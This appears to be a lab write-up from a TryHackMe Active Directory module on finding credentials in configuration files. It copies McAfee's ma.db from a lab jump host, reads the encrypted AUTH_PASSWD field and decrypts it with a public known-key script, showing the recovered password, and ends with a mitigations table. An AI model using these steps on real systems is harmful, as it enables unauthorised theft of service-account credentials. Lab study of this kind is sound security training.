# LAB — Enumerating Configuration Files

---

## Concept

Applications deployed across enterprise networks often need to authenticate to AD during installation and execution. These credentials are frequently stored in **configuration files** — sometimes in plaintext, sometimes with weak/known encryption.

Common sources of config file credentials:

- `wp-config.php` (WordPress database credentials)
- IIS / SQL / MSSQL service configuration files
- Registry keys
- Endpoint security management tools (McAfee, etc.)
- CI/CD platforms (Jenkins, GitLab)

> [!IMPORTANT]
> If you gain a foothold on any host, follow a detailed methodology to search for stored credentials in configuration files.

---

## Lab Scenario: McAfee Agent `ma.db`

McAfee Enterprise Endpoint Security embeds credentials during installation to connect back to the ePO orchestrator. These credentials are stored in a database file called **`ma.db`**.

- The `AUTH_PASSWD` field is encrypted, but McAfee uses a **known key** — so it can be decrypted.

---

## Step 1 — Retrieve `ma.db` via SCP

SSH into the jump host, then use SCP to copy the database to your Kali machine:

```bash
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

Example output:


## Step 2 — Inspect the Database with SQLite Browser

```bash
sqlitebrowser ma.db
```

1. Select **Browse Data**.
2. Navigate to the **AGENT_REPOSITORIES** table.

Focus on the second entry — note these fields:

```
AUTH_USER   : svcAV
AUTH_PASSWD : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

The `AUTH_PASSWD` is base64-encoded and encrypted — but with a **known key**.

---

## Step 3 — Decrypt the Password

Use the McAfee sitelist password decryption script:

**GitHub**: [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)

```bash
# If using the provided zip:
unzip mcafeesitelistpwddecryption.zip

# Decrypt (Python 3)
python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

Output:

```
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

> [!NOTE]
> The tool originally used Python 2 and an old crypto library. The latest version supports Python 3.

## Module Mitigations Summary

| Mitigation | Detail |
|---|---|
| **User awareness & training** | Train users not to disclose credentials or trust suspicious emails |
| **Limit AD service exposure** | Don't expose NTLM/LDAP-authenticated apps to the internet; place behind VPN with MFA |
| **Network Access Control (NAC)** | Prevent rogue devices from joining the network (allowlist legitimate devices) |
| **Enforce SMB Signing** | Prevents SMB relay attacks |
| **Principle of Least Privilege** | Especially for service accounts — a compromised credential with minimal rights = minimal damage |
